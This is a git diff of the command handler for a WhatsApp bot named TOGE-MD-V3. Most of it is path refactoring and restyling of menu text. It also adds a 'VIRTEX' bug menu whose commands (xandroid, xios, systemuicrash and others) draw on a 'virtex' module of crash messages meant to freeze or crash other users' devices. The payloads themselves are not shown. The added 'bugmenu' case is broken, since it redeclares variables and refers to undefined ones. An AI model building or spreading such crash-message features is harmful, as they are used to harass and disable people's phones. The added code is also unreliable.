@@ -24,12 +24,12 @@ const { exec, spawn, execSync } = require("child_process")
 const { performance } = require('perf_hooks')
 const more = String.fromCharCode(8206)
 const readmore = more.repeat(4001)
-const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./Media/lib/uploader')
-const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./Media/lib/converter')
-const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./Media/lib/myfunc')
-let afk = require("./Media/lib/afk");
+const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
+const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
+const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
+let afk = require("./lib/afk");
 const { download } = require('aptoide-scraper');
-const { fetchBuffer, buffergif } = require("./Media/lib/myfunc2")
+const { fetchBuffer, buffergif } = require("./lib/myfunc2")
 //bug database
 const { toge1 } = require('./virtex/toge1')
 const { toge2 } = require('./virtex/toge2')
@@ -47,12 +47,12 @@ const o = fs.readFileSync(`./virtex/o.jpg`)
 /////log
  global.modnumber = '24105114159' 
 //Media/database
-let ntilinkall =JSON.parse(fs.readFileSync('./Media/database/antilink.json'));
+let ntilinkall =JSON.parse(fs.readFileSync('./database/antilink.json'));
 // let autoblck =JSON.parse(fs.readFileSync('./Media/database/autoblock.json'));
-const isnsfw = JSON.parse(fs.readFileSync('./Media/database/nsfw.json'));
+const isnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
 
-let _afk = JSON.parse(fs.readFileSync('./Media/database/afk-user.json'))
-let hit = JSON.parse(fs.readFileSync('./Media/database/total-hit-user.json'))
+let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
+let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
 
 //time
 const replay = (teks) => {
@@ -183,7 +183,7 @@ const getRandomImage = (directory) => {
   }
 };
 
-const imageDirectory = './Media/Theme-logo';
+const imageDirectory = './Media/logo';
   const randomImage = getRandomImage(imageDirectory);
 
 //group chat msg by Ayush
@@ -294,7 +294,7 @@ async function Telesticker(url) {
         }
         
         if (autobio) {
-            Maria.updateProfileStatus(`Hey, future leaders! 🌟 TOGE-MD-V3 is here to inspire and lead, thanks to  toge012345. 🚀 ${runtime(process.uptime())} `).catch(_ => _)
+            Maria.updateProfileStatus(`𝙷𝚎𝚢, 𝚏𝚞𝚝𝚞𝚛𝚎 𝚕𝚎𝚊𝚍𝚎𝚛𝚜! 🌟 𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟹 𝚒𝚜 𝚑𝚎𝚛𝚎 𝚝𝚘 𝚒𝚗𝚜𝚙𝚒𝚛𝚎 𝚊𝚗𝚍 𝚕𝚎𝚊𝚍, 𝚝𝚑𝚊𝚗𝚔𝚜 𝚝𝚘  𝚝𝚘𝚐𝚎𝟶𝟷𝟸𝟹𝟺𝟻. ${runtime(process.uptime())} `).catch(_ => _)
         }
         if (m.sender.startsWith('212') && global.anti212 === true) {
             return Maria.updateBlockStatus(m.sender, 'block')
@@ -337,12 +337,12 @@ async function Telesticker(url) {
         if (command) {
             const cmdadd = () => {
                 hit[0].hit_cmd += 1
-                fs.writeFileSync('./Media/database/total-hit-user.json', JSON.stringify(hit))
+                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
             }
             cmdadd()
-            const totalhit = JSON.parse(fs.readFileSync('./Media/database/total-hit-user.json'))[0].hit_cmd
+            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
         }
-        const photooxy = require('./Media/lib/photooxy')
+        const photooxy = require('./lib/photooxy')
         
         
 
@@ -363,7 +363,7 @@ async function Telesticker(url) {
                 let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                 let heheh = ms(getTime)
                 _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
-                fs.writeFileSync('./Media/database/afk-user.json', JSON.stringify(_afk))
+                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                 Maria.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
             }
         }
@@ -444,7 +444,7 @@ const verificationBot = await verification();
 
 if (!verificationBot) {
 m.reply(`⛩️ *❯─「 TOGE-MD-V3 」─❮* ⛩️\n
-Join our support group to interact with TOGE-MD-V3 🌟 \n\n https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`);
+𝙹𝚘𝚒𝚗 𝚘𝚞𝚛 𝚜𝚞𝚙𝚙𝚘𝚛𝚝 𝚐𝚛𝚘𝚞𝚙 𝚝𝚘 𝚒𝚗𝚝𝚎𝚛𝚊𝚌𝚝 𝚠𝚒𝚝𝚑 𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟹 🌟 \n\n https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`);
 return;
 }
 
@@ -648,7 +648,7 @@ if (!isCreator) return replay(mess.botowner)
 if (args[0] === "on") {
 if (AutoBlock) return reply('Already activated')
 ntilinkall.push(from)
-fs.writeFileSync('./Gallery/database/autoblock.json', JSON.stringify(ntilinkall))
+fs.writeFileSync('./database/autoblock.json', JSON.stringify(ntilinkall))
 reply('Success in turning on all autoblock in this group')
 var groupe = await Maria.groupMetadata(from)
 var members = groupe['participants']
@@ -661,7 +661,7 @@ Maria.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nDont 
 if (!AutoBlock) return reply('Already deactivated')
 let off = ntilinkall.indexOf(from)
 ntilinkall.splice(off, 1)
-fs.writeFileSync('./Gallery/database/autoblock.json', JSON.stringify(ntilinkall))
+fs.writeFileSync('./database/autoblock.json', JSON.stringify(ntilinkall))
 reply('Success in turning off all autoblock in this group')
 } else {
   await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
@@ -677,7 +677,7 @@ reply('Success in turning off all autoblock in this group')
 if (args[0] === "on") {
 if (AntiLinkAll) return reply('Already activated')
 ntilinkall.push(from)
-fs.writeFileSync('./Media/database/antilink.json', JSON.stringify(ntilinkall))
+fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilinkall))
 reply('Success in turning on all antilink in this group')
 var groupe = await Maria.groupMetadata(from)
 var members = groupe['participants']
@@ -685,12 +685,12 @@ var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-Maria.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Maria.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\n𝙸𝚏 𝚢𝚘𝚞'𝚛𝚎 𝚗𝚘𝚝 𝚊𝚗 𝚊𝚍𝚖𝚒𝚗, 𝚍𝚘𝚗'𝚝 𝚜𝚎𝚗𝚍 𝚊𝚗𝚢 𝚕𝚒𝚗𝚔 𝚒𝚗 𝚝𝚑𝚒𝚜 𝚐𝚛𝚘𝚞𝚙 𝚘𝚛 𝚞 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚔𝚒𝚌𝚔𝚎𝚍 𝚒𝚖𝚖𝚎𝚍𝚒𝚊𝚝𝚎𝚕𝚢!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkAll) return reply('Already desactivated')
 let off = ntilinkall.indexOf(from)
 ntilinkall.splice(off, 1)
-fs.writeFileSync('./Media/database/antilinkall.json', JSON.stringify(ntilinkall))
+fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
 reply('Success in turning off all antilink in this group')
 } else {
   await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
@@ -1034,9 +1034,9 @@ break;
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
-                                title: ' *🎐 TOGE-MD-V3 BROADCAST🎐* ',
+                                title: '𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟹 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃',
                                 body: `Sent ${i.length} Group`,
-                                thumbnailUrl: 'https://telegra.ph/file/2617e9472f08cb3d3c5e2.jpg',
+                               thumbnailUrl: 'https://telegra.ph/file/2617e9472f08cb3d3c5e2.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -1245,7 +1245,7 @@ case 'tag': case 'tagall': case 'all':{
   
  *Message : ${args.join(" ") ? args.join(" ") : 'no message'}*\n\n`
  for (let mem of participants) {
- teks += `🔮 @${mem.id.split('@')[0]}\n`
+ teks += `👾 @${mem.id.split('@')[0]}\n`
  }
  Maria.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
  }
@@ -1296,7 +1296,7 @@ case 'tag': case 'tagall': case 'all':{
           let response = await Maria.groupInviteCode(m.chat);
           Maria.sendText(
             m.sender,
-            ` 🤖𝐵𝑜𝑡 𝑛𝑎𝑚𝑒:- 𝐓𝐎𝐆𝐄-𝐌𝐃-𝐕𝟑.\n\n🔖𝐺𝑟𝑜𝑢𝑝 𝑛𝑎𝑚𝑒:- ${groupMetadata.subject}\n\n🔰𝐺𝑟𝑜𝑢𝑝 𝑙𝑖𝑛𝑘:- https://chat.whatsapp.com/${response}`,
+            ` 🤖𝐵𝑜𝑡 𝑛𝑎𝑚𝑒:- 𝐓𝐎𝐆𝐄-𝐌𝐃-𝐕𝟑\n\n🔖𝐺𝑟𝑜𝑢𝑝 𝑛𝑎𝑚𝑒:- ${groupMetadata.subject}\n\n🔰𝐺𝑟𝑜𝑢𝑝 𝑙𝑖𝑛𝑘:- https://chat.whatsapp.com/${response}`,
             m,
             { detectLink: true }
           );
@@ -1323,7 +1323,7 @@ let repoInfo = await axios.get("https://api.github.com/repos/toge012345/TOGE-MD-
         console.log(repo);
 
    const scritxt = `*🚀𝐓𝐎𝐆𝐄-𝐌𝐃-𝐕𝟑.🚀*\n
-  *🌟Creator:* 𓆩𝐓𝐎𝐆𝐄𓆪 ✇ ◤✞𝐈𝐍𝐔𝐌𝐀𝐊𝐈\n
+  *🌟 Creator:* 𓆩𝐓𝐎𝐆𝐄𓆪 ✇ ◤✞𝐈𝐍𝐔𝐌𝐀𝐊𝐈\n
   *🌟 Repo:* ${repo.html_url}\n
   *🌟 Total Forks:* ${repo.forks_count}\n
   *⭐ Total Stars:* ${repo.stargazers_count}\n
@@ -1452,7 +1452,7 @@ break;
                 Maria.sendMessage(m.chat, {
                     document: audio,
                     mimetype: 'audio/mp3',
-                    fileName: `Maria-bot.mp3`
+                    fileName: `toge-bot.mp3`
                 }, {
                     quoted: m
                 })
@@ -1466,7 +1466,7 @@ break;
                 let media = await Maria.downloadMediaMessage(qmsg)
                 let {
                     toPTT
-                } = require('./Media/lib/converter')
+                } = require('./lib/converter')
                 let audio = await toPTT(media, 'mp4')
                 Maria.sendMessage(m.chat, {
                     audio: audio,
@@ -1596,7 +1596,7 @@ break;
       case 'qc': {
                 const {
                     quote
-                } = require('./Media/lib/quote.js')
+                } = require('./lib/quote.js')
                 if (!q) return reply('Enter Text')
                 let ppnyauser = await await Maria.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/2617e9472f08cb3d3c5e2.jpg')
                 const rest = await quote(q, pushname, ppnyauser)
@@ -1611,7 +1611,7 @@ break;
 case 'play':  case 'song': {
 Maria.sendMessage(from, { react: { text: "📥", key: m.key }}) 
 if (!text) return reply(`🍭𝑷𝒍𝒆𝒂𝒔𝒆 𝒎𝒆𝒏𝒕𝒊𝒐𝒏 𝒂 𝒔𝒐𝒏𝒈 𝒏𝒂𝒎𝒆 𝒅𝒂𝒓𝒍𝒊𝒏𝒈 \n\n 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command}  𝒂𝒏𝒊𝒎𝒆 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 𝒔𝒕𝒂𝒕𝒖𝒔`)
-const Ayushplaymp3 = require('./Media/lib/ytdl2')
+const Ayushplaymp3 = require('./lib/ytdl2')
 let yts = require("youtube-yts")
         let search = await yts(text)
         let anup3k = search.videos[0]
@@ -1637,7 +1637,7 @@ await fs.unlinkSync(pl.path)
 break;
 
 case 'ytmp4': case 'ytvideo': {
-const Ayushvidoh = require('./Media/lib/ytdl2')
+const Ayushvidoh = require('./lib/ytdl2')
 if (args.length < 1 || !isUrl(text) || !Ayushvidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
 const vid=await Ayushvidoh.mp4(text)
 const ytc=`
@@ -1700,12 +1700,10 @@ case 'chatgpt':
         Maria.sendMessage(from, { video: { url: 'https://telegra.ph/file/71df5c808c38683e8b304.mp4' }, gifPlayback: true, caption: helptxt }, { quoted: m })
 
         break;
-      case 'hii': case 'hi': case 'Hi':
+      case 'toge':
        
         
-        let txxt = `*U^I^U ♡* Konichiwa ${pushname} Senpai, I'm TOGE-MD-V3 Created by
-
- *_Team toge_*.`
+        let txxt = `𝚑𝚎𝚕𝚕𝚘 ${pushname} 𝙸 𝚊𝚖 𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟹 𝚊 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚋𝚘𝚝 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸 𝚑𝚘𝚠 𝚌𝚊𝚗 𝙸 𝚑𝚎𝚕𝚙 𝚢𝚘𝚞 𝚋𝚊𝚋𝚢 ?`
 
         Maria.sendMessage(m.chat, { image: { url: "https://telegra.ph/file/2617e9472f08cb3d3c5e2.jpg" }, caption: txxt}, { quoted: m });
         
@@ -1732,7 +1730,7 @@ case 'chatgpt':
 \`\`\`This bot is a free open source project by toge012345\`\`\`
 
 ❁ ═════ ❃•📑 *GITHUB* 📑•❃ ═════ ❁
-*_LINK:- https://github.com/toge012345/TOGE-MD-V3_*
+*_LINK:- https://github.com/toge012345/TOGE-MD-V3 ._*
 
 
 ❁ ═══ ❃•✍🏻 *CONTRIBUTE* ✍🏻•❃ ═══ ❁
@@ -2171,22 +2169,23 @@ break;
                          
                            
   case 'menu': case 'help': case 'h': 
-      const txt = `┏━⍟*Konichiwa*⍟
-┃✺ 𝕌𝕤𝕖𝕣: ${pushname} 
-┃✺ 𝔹𝕠𝕥:  ${botname}
-┃✺ ℙ𝕣𝕖𝕗𝕚𝕩:  *${prefix}*
-┃✺ 𝔻𝕒𝕥𝕖: ${Ayuxxdate}
-┃✺ 𝕋𝕚𝕞𝕖:  ${xtime}
-┃✺ 𝕆𝕨𝕟𝕖𝕣: ${ownername}
-┃✺ 𝕧𝕖𝕣𝕤𝕚𝕠𝕟: ${mver}
-┃✺ ℍ𝕠𝕤𝕥: ${os.hostname()}
-┃✺ ℙ𝕝𝕒𝕥𝕗𝕠𝕣𝕞: ${os.platform()} 
-┃✺ ℝ𝕦𝕟𝕥𝕚𝕞𝕖: ${runtime(process.uptime())}
-┃✺ 𝕋𝕠𝕥𝕒𝕝𝕔𝕞𝕕: ${mariafeature()}
+      const txt = `┏━⍟ *TOGE-MD-V3* ⍟
+┃✺ 𝖀𝖘𝖊𝖗: ${pushname} 
+┃✺ 𝕭𝖔𝖙:  ${botname}
+┃✺ 𝕻𝖗𝖊𝖋𝖎𝖝:  *${prefix}*
+┃✺ 𝕯𝖆𝖙𝖊: ${Ayuxxdate}
+┃✺ 𝕿𝖎𝖒𝖊:  ${xtime}
+┃✺ 𝕺𝖜𝖓𝖊𝖗: ${ownername}
+┃✺ 𝖁𝖊𝖗𝖘𝖎𝖔𝖓: ${mver}
+┃✺ 𝕳𝖔𝖘𝖙: ${os.hostname()}
+┃✺ 𝕻𝖑𝖆𝖙𝖊𝖋𝖔𝖗𝖒: ${os.platform()} 
+┃✺ 𝕽𝖚𝖓𝖙𝖎𝖒𝖊: ${runtime(process.uptime())}
+┃✺ 𝕿𝖔𝖙𝖆𝖑𝖈𝖒𝖉: ${mariafeature()}
 ┗━━━━━━━━━━━━━━━⊛ ${readmore}
+𝙰𝙻𝙻 𝙼𝙴𝙽𝚄 ${readmore}
 
-┏━⍟*🧧GENERAL🧧*⍟
-┃✺ ${prefix}hi
+┏━⍟ *GENERAL* ⍟
+┃✺ ${prefix}toge
 ┃✺ ${prefix}dev
 ┃✺ ${prefix}info
 ┃✺ ${prefix}support
@@ -2199,18 +2198,18 @@ break;
 ┃✺ ${prefix}owner
 ┃✺ ${prefix}script
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*🎓Education🎓*⍟
+┏━⍟ *Education* ⍟
 ┃✺ ${prefix}element 
 ┃✺ ${prefix}calculator 
 ┃✺ ${prefix}sciencefact
 ┃✺ ${prefix}sciencenews
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*💻Coding💻*⍟
+┏━⍟ *Coding* ⍟
 ┃✺ ${prefix}exec 
 ┃✺ ${prefix}run
 ┃✺ ${prefix}gitclone
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*🧩OWNER🧩*⍟
+┏━⍟ *OWNER* ⍟
 ┃✺ ${prefix}session
 ┃✺ ${prefix}join
 ┃✺ ${prefix}mode
@@ -2230,7 +2229,7 @@ break;
 ┃✺ ${prefix}getcase
 ┃✺ ${prefix}creategc
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*👮🏻‍♂️GROUP👮🏻‍♂️*⍟
+┏━⍟ *GROUP* ⍟
 ┃✺ ${prefix}antilink
 ┃✺ ${prefix}closetime
 ┃✺ ${prefix}opentime
@@ -2251,7 +2250,7 @@ break;
 ┃✺ ${prefix}revoke
 ┃✺ ${prefix}listonline
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*🎉FUN🎉*⍟
+┏━⍟ *FUN* ⍟
 ┃✺ ${prefix}truth
 ┃✺ ${prefix}dare
 ┃✺ ${prefix}couple 
@@ -2274,7 +2273,7 @@ break;
 ┃✺ ${prefix}greatcheck
 ┃✺ ${prefix}awesomecheck 
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*📂download📂*⍟
+┏━⍟ *download* ⍟
 ┃✺ ${prefix}play
 ┃✺ ${prefix}ytmp3
 ┃✺ ${prefix}ytmp4
@@ -2287,12 +2286,12 @@ break;
 ┃✺ ${prefix}telestick
 ┃✺ ${prefix}tgs
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*✨️WALLPAPER✨️*⍟
+┏━⍟ *WALLPAPER* ⍟
 ┃✺ ${prefix}Doraemon
 ┃✺ ${prefix}pokemon 
 ┃✺ ${prefix}zero-two 
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*🎐SnapBlend🎐*
+┏━⍟ *SnapBlend* ⍟
 ┃✺ ${prefix}shadow
 ┃✺ ${prefix}write
 ┃✺ ${prefix}smoke
@@ -2309,7 +2308,7 @@ break;
 ┃✺ ${prefix}narutobanner
 ┃✺ ${prefix}shinetext
 ┗━━━━━━━━━━━━━━━⊛
-┏━⍟*⛩️OTHERS⛩️*⍟
+┏━⍟ *OTHERS* ⍟
 ┃✺ ${prefix}sticker
 ┃✺ ${prefix}qc
 ┃✺ ${prefix}smeme
@@ -2335,7 +2334,7 @@ break;
 ┃✺ ${prefix}tts
 ┃✺ ${prefix}obfuscate
 └──────────⊰
-┏━⍟*🃏Games🃏*⍟
+┏━⍟ *Games* ⍟
 ┃✺ ${prefix}slot
 ┃✺ ${prefix}poker
 ┃✺ ${prefix}dice
@@ -2345,6 +2344,15 @@ break;
 ┃✺ ${prefix}roulette
 ┃✺ ${prefix}blackjack
 ┃✺ ${prefix}compliment
+┗━━━━━━━━━━━━━━━⊛
+┏━⍟ *VIRTEX* ⍟
+┃✺ ${prefix}xandroid
+┃✺ ${prefix}xandroid2
+┃✺ ${prefix}xios
+┃✺ ${prefix}xios2
+┃✺ ${prefix}xsysui
+┃✺ ${prefix}xgc
+┃✺ ${prefix}systemuicrash 
 ┗━━━━━━━━━━━━━━━⊛`
 
   let menumsg = generateWAMessageFromContent(from, {
@@ -2504,7 +2512,7 @@ case 'public': {
         if (!isNsfw) return reply(mess.nsfw);
         if (!m.isGroup) return reply(mess.group);
         
-        const nsfwmenu=`┏━⍟*🔞NSFW 🔞*⍟
+        const nsfwmenu=`┏━⍟ *NSFW* ⍟
 ┃✺ ${prefix}blowjob
 ┃✺ ${prefix}cum
 ┃✺ ${prefix}foot
@@ -2532,8 +2540,8 @@ case 'public': {
 ////////////////////menu_v2.1///////////////////////
    
 case 'generalmenu':
-    const generalmenu = `┏━⍟*🧧GENERAL🧧*⍟
-┃✺ ${prefix}hi
+    const generalmenu = `┏━⍟ *GENERAL* ⍟
+┃✺ ${prefix}toge
 ┃✺ ${prefix}dev
 ┃✺ ${prefix}info
 ┃✺ ${prefix}support
@@ -2612,7 +2620,7 @@ await Maria.relayMessage(gmsg.key.remoteJid, gmsg.message, {
     
     
  case 'educationmenu':
-    const educationmenu = `┏━⍟*🎓Education🎓*⍟
+    const educationmenu = `┏━⍟ *Education* ⍟
 ┃✺ ${prefix}element 
 ┃✺ ${prefix}calculator 
 ┃✺ ${prefix}sciencefact
@@ -2684,7 +2692,7 @@ await Maria.relayMessage(emsg.key.remoteJid, emsg.message, {
     
     
  case 'codingmenu':
-    const codingmenu = `┏━⍟*💻Coding💻*⍟
+    const codingmenu = `┏━⍟ *Coding* ⍟
 ┃✺ ${prefix}exec
 ┃✺ ${prefix}run
 ┃✺ ${prefix}gitclone
@@ -2755,7 +2763,7 @@ await Maria.relayMessage(cmsg.key.remoteJid, cmsg.message, {
          
    
  case 'ownermenu':
-    const ownermenu = `┏━⍟*🧩OWNER🧩*⍟
+    const ownermenu = `┏━⍟ *OWNER* ⍟
 ┃✺ ${prefix}session
 ┃✺ ${prefix}join
 ┃✺ ${prefix}mode
@@ -2840,7 +2848,7 @@ await Maria.relayMessage(owmsg.key.remoteJid, owmsg.message, {
  break
      
   case 'groupmenu':
-    const groupmenu = `┏━⍟*👮🏻‍♂️GROUP👮🏻‍♂️*⍟
+    const groupmenu = `┏━⍟ *GROUP* ⍟
 ┃✺ ${prefix}antilink
 ┃✺ ${prefix}closetime
 ┃✺ ${prefix}opentime
@@ -2852,7 +2860,7 @@ await Maria.relayMessage(owmsg.key.remoteJid, owmsg.message, {
 ┃✺ ${prefix}tagall
 ┃✺ ${prefix}hidetag
 ┃✺ ${prefix}totag
-┃✺ ${prefix}group *[option]*
+┃✺ ${prefix}group
 ┃✺ ${prefix}editinfo
 ┃✺ ${prefix}gclink
 ┃✺ ${prefix}revoke
@@ -2924,7 +2932,7 @@ await Maria.relayMessage(gcmsg.key.remoteJid, gcmsg.message, {
  break
     
   case 'funmenu':
-    const funmenu = `┏━⍟*🎉FUN🎉*⍟
+    const funmenu = `┏━⍟ *FUN* ⍟
 ┃✺ ${prefix}truth
 ┃✺ ${prefix}dare
 ┃✺ ${prefix}couple 
@@ -3014,7 +3022,7 @@ await Maria.relayMessage(funmsg.key.remoteJid, funmsg.message, {
     
   
    case 'downloadmenu':
-    const downloadmenu = `┏━⍟*📂download📂*⍟
+    const downloadmenu = `┏━⍟ *download* ⍟
 ┃✺ ${prefix}play
 ┃✺ ${prefix}ytmp3
 ┃✺ ${prefix}ytmp4
@@ -3093,7 +3101,7 @@ await Maria.relayMessage(dowmsg.key.remoteJid, dowmsg.message, {
     
     
 case 'wallmenu':
-        const wallmenu=`┏━⍟*✨️WALLPAPER✨️*⍟
+        const wallmenu=`┏━⍟ *WALLPAPER* ⍟
 ┃✺ ${prefix}Doraemon
 ┃✺ ${prefix}pokemon 
 ┃✺ ${prefix}zero-two 
@@ -3163,7 +3171,7 @@ await Maria.relayMessage(wallmsg.key.remoteJid, wallmsg.message, {
  break
     
   case 'snapblendmenu':
-    const snapblendmenu = `┏━⍟*🎐SnapBlend🎐*⍟
+    const snapblendmenu = `┏━⍟ *SnapBlend* ⍟
 ┃✺ ${prefix}shadow
 ┃✺ ${prefix}write
 ┃✺ ${prefix}smoke
@@ -3245,7 +3253,7 @@ await Maria.relayMessage(snamsg.key.remoteJid,  snamsg.message, {
     
     
   case 'othersmenu':
-    const othersmenu = `┏━⍟*⛩️OTHERS⛩️*⍟
+    const othersmenu = `┏━⍟ *OTHERS* ⍟
 ┃✺ ${prefix}sticker
 ┃✺ ${prefix}qc
 ┃✺ ${prefix}smeme
@@ -3271,7 +3279,7 @@ await Maria.relayMessage(snamsg.key.remoteJid,  snamsg.message, {
 ┃✺ ${prefix}obfuscate
 ┗━━━━━━━━━━━━━━━⊛
 `
-let othmsg = generateWAMessageFromContent(from, {
+    let othmsg = generateWAMessageFromContent(from, {
   viewOnceMessage: {
     message: {
         "messageContextInfo": {
@@ -3335,7 +3343,7 @@ await Maria.relayMessage(othmsg.key.remoteJid, othmsg.message, {
     
        
   case 'gamemenu':
-    const gamesmenu = `┏━⍟*🃏Games🃏*⍟
+    const gamesmenu = `┏━⍟ *Games* ⍟
 ┃✺ ${prefix}slot
 ┃✺ ${prefix}poker
 ┃✺ ${prefix}dice
@@ -3347,7 +3355,7 @@ await Maria.relayMessage(othmsg.key.remoteJid, othmsg.message, {
 ┃✺ ${prefix}compliment
 ┗━━━━━━━━━━━━━━━⊛
 `
-    let gamemsg = generateWAMessageFromContent(from, {
+let gamemsg = generateWAMessageFromContent(from, {
   viewOnceMessage: {
     message: {
         "messageContextInfo": {
@@ -3408,10 +3416,83 @@ await Maria.relayMessage(gamemsg.key.remoteJid, gamemsg.message, {
   messageId: gamemsg.key.id
 })
  break
+			    
     
-    
-    
-    case 'alive': {
+case 'bugmenu':
+  const gamesmenu = `┏━⍟ *VIRTEX* ⍟
+┃✺ ${prefix}xandroid
+┃✺ ${prefix}xandroid2 
+┃✺ ${prefix}xios
+┃✺ ${prefix}xios2
+┃✺ ${prefix}xsysui
+┃✺ ${prefix}xgc
+┃✺ ${prefix}systemuicrash 
+┗━━━━━━━━━━━━━━━⊛
+ `
+     let gamemsg = generateWAMessageFromContent(from, {
+   viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ""
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                ...(await prepareWAMessageMedia({ image : fs.readFileSync(randomImage)}, { upload: Maria.waUploadToServer})), 
+            title: bugmenu,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+                            {
+  "name": "quick_reply",
+  "buttonParamsJson": `{"display_text":"Back 🎐","id":"${prefix}list"}`
+   },
+   
+                               {
+  "name": "quick_reply",
+  "buttonParamsJson": `{"display_text":"Script🎀","id":"${prefix}sc"}`
+   },
+              {
+                 "name": "cta_url",
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp🚀 \",\"url\":\"https://whatsapp.com/channel/0029VaiuD4s4IBhI0fzbv40Z\",\"merchant_url\":\"https://www.google.com\"}"
+              },
+              {
+                 "name": "cta_url",
+                 "buttonParamsJson": "{\"display_text\":\"Youtube 🥵 \",\"url\":\"https://youtube.com/@kenzo3146\",\"merchant_url\":\"https://www.google.com\"}"
+              }
+
+           ],
+          }),
+          contextInfo: {
+                  mentionedJid: [m.sender], 
+                  forwardingScore: 999,
+                  isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: '1203632993333611780@newsletter',
+                  newsletterName: "𝚃𝚘𝙶𝚎 𝙸𝚗𝚄𝚖𝙰𝚔𝙸",
+                  serverMessageId: 143
+                }
+                }
+        })
+    }
+  }
+}, {})
+
+await Maria.relayMessage(bugmsg.key.remoteJid, bugmsg.message, {
+  messageId: bugmsg.key.id
+})
+ break
+	    
+
+case 'alive': {
   const alivem = `┏━━━━❮ 𝚫𝐋𝚰𝛁𝚵 ❯━━━━━᯽
 ┃ *🤖 Bot Name:* ${botname}
 ┃ *👨‍✈️ Creator:* ${ownername}
@@ -3567,6 +3648,10 @@ let liistmsg = generateWAMessageFromContent(from, {
    {
   "name": "quick_reply",
   "buttonParamsJson": `{"display_text":"⛩️OTHERS⛩️","id":"${prefix}othersmenu"}`
+   },
+   {
+  "name": "quick_reply",
+  "buttonParamsJson": `{"display_text":"👾VIRTEX👾","id":"${prefix}bugmenu"}`
    },
    {
   "name": "quick_reply",
@@ -3779,7 +3864,7 @@ break;
 if (args[0] === "on") {
 if (AntiNsfw) return reply('Already activated✅️')
 isnsfw.push(from)
-fs.writeFileSync('./Media/database/nsfw.json', JSON.stringify(isnsfw))
+fs.writeFileSync('./database/nsfw.json', JSON.stringify(isnsfw))
 reply('Successfully activating nsfw mode in this group ✔️')
 var groupe = await Maria.groupMetadata(from)
 var members = groupe['participants']
